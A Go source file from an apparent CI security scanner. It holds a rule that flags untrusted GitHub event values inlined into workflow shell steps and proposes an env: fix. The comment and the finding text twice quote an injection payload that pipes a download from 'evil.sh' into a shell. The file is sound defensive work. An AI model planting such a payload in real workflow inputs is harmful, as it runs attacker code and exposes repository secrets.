package rules

import (
	"fmt"
	"strings"

	"github.com/mdryaaan/pipelinesentinel/internal/finding"
	"github.com/mdryaaan/pipelinesentinel/internal/parser"
	"github.com/mdryaaan/pipelinesentinel/internal/utils"
)

// ScriptInjectionRule flags untrusted input interpolated into a shell.
type ScriptInjectionRule struct{}

// NewScriptInjectionRule builds the rule.
func NewScriptInjectionRule() *ScriptInjectionRule { return &ScriptInjectionRule{} }

// ID returns the rule identifier.
func (r *ScriptInjectionRule) ID() finding.RuleID { return finding.RuleScriptInjection }

// Description summarises the rule.
func (r *ScriptInjectionRule) Description() string {
	return "Untrusted `github.event.*` values must reach a shell through env:, never inlined into run:."
}

// Check flags `${{ }}` expressions over untrusted context inside a `run:` body.
//
// Expressions are substituted textually *before* the shell sees the script, so
// an issue titled `"; curl evil.sh | sh; #` becomes a command. Routing the value
// through `env:` and referencing `$VAR` avoids this entirely, because the shell
// then treats it as data.
//
// Severity depends on the trigger. Under `pull_request_target` or
// `issue_comment` the attacker is any GitHub user and the job holds real
// secrets, so it is critical; on `push` only someone with write access can
// reach it, which is a far weaker position.
func (r *ScriptInjectionRule) Check(wf *parser.Workflow) []finding.Finding {
	var out []finding.Finding

	trigger, untrustedTrigger := r.riskiestTrigger(wf)

	for _, job := range wf.Jobs {
		for _, step := range job.Steps {
			if step.Run.Empty() {
				continue
			}

			for _, expr := range expressions(step.Run.Value) {
				hits := untrustedIn(expr)
				if len(hits) == 0 {
					continue
				}

				raw := "${{ " + expr + " }}"
				offset := lineWithin(step.Run.Value, expr)
				line := parser.LineOffset(step.RunBodyPos, offset)
				source := wf.LineAt(line)

				severity := finding.High
				confidence := finding.Certain
				if !untrustedTrigger {
					// Reachable only by someone who can already push, so the
					// exploitability genuinely depends on context the rule
					// cannot see. This is what the LLM pass adjudicates.
					severity = finding.Medium
					confidence = finding.Ambiguous
				} else if trigger == "pull_request_target" || trigger == "issue_comment" {
					severity = finding.Critical
				}

				envName := suggestEnvName(hits[0])
				fixed := strings.Replace(source, raw, "$"+envName, 1)

				out = append(out, finding.Finding{
					RuleID:   r.ID(),
					Severity: severity,
					File:     wf.File,
					Line:     line,
					Job:      job.ID.Value,
					Step:     stepLabel(step),
					Title:    fmt.Sprintf("Untrusted %s interpolated into a run block", hits[0]),
					Detail: fmt.Sprintf(
						"`%s` is expanded into the shell script before the shell parses it, so a "+
							"value such as `\"; curl evil.sh | sh; #` becomes a command rather than "+
							"text. This workflow is triggered by `%s`. Pass the value through `env:` "+
							"and reference `$%s` instead, which the shell treats as data.",
						raw, trigger, envName),
					Snippet:    wf.Snippet(line, 2),
					Confidence: confidence,
					Fix: utils.UnifiedDiff(wf.File, line, source, fixed) +
						fmt.Sprintf("\n# and add to the step:\n#   env:\n#     %s: %s\n", envName, raw),
					References: []string{
						"https://securitylab.github.com/resources/github-actions-untrusted-input/",
					},
				})
			}
		}
	}

	return out
}

// riskiestTrigger returns the workflow's most dangerous trigger and whether it
// is attacker-influenced.
func (r *ScriptInjectionRule) riskiestTrigger(wf *parser.Workflow) (string, bool) {
	// Ordered by how much access an attacker needs, least first.
	priority := []string{"pull_request_target", "issue_comment", "issues", "discussion_comment",
		"discussion", "workflow_run", "pull_request"}

	for _, want := range priority {
		if wf.HasTrigger(want) {
			return want, untrustedTriggers[want] || want == "pull_request"
		}
	}
	if len(wf.Triggers) > 0 {
		return wf.Triggers[0].Value, false
	}
	return "unknown", false
}

// suggestEnvName turns a context path into a conventional env var name.
func suggestEnvName(ctx string) string {
	parts := strings.Split(ctx, ".")
	if len(parts) < 2 {
		return "UNTRUSTED_INPUT"
	}
	tail := parts[len(parts)-2:]
	name := strings.ToUpper(strings.Join(tail, "_"))
	return strings.ReplaceAll(name, "-", "_")
}
